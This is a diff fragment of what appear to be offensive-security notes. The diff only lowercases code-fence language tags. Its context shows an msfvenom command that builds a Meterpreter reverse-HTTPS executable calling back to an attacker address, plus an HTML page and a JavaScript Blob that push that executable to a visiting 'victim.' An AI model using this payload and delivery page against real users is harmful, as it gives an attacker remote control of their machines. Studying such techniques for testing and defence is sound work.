@@ -31,13 +31,13 @@ When a user clicks this link from an HTML5-compatible browser, the `msfstaged.ex
 
 Generate msfstaged.exe
 
-```Bash
+```bash
 sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.69 LPORT=443 -f exe -o msfstaged.exe
 ```
 
 Web application to serve and offer the malicious code.
 
-```HTML
+```html
 <html>
     <body>
       <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
@@ -51,7 +51,7 @@ The following JavaScript code contains a `Blob` with the Meterpreter executable 
 
 Download is triggered automatically after the victim visits the page. Unfortunately, a warning may be displayed due to the potentially unsafe file format.
 
-```JavaScript
+```javascript
 <!DOCTYPE html>
 <html>
 <head>
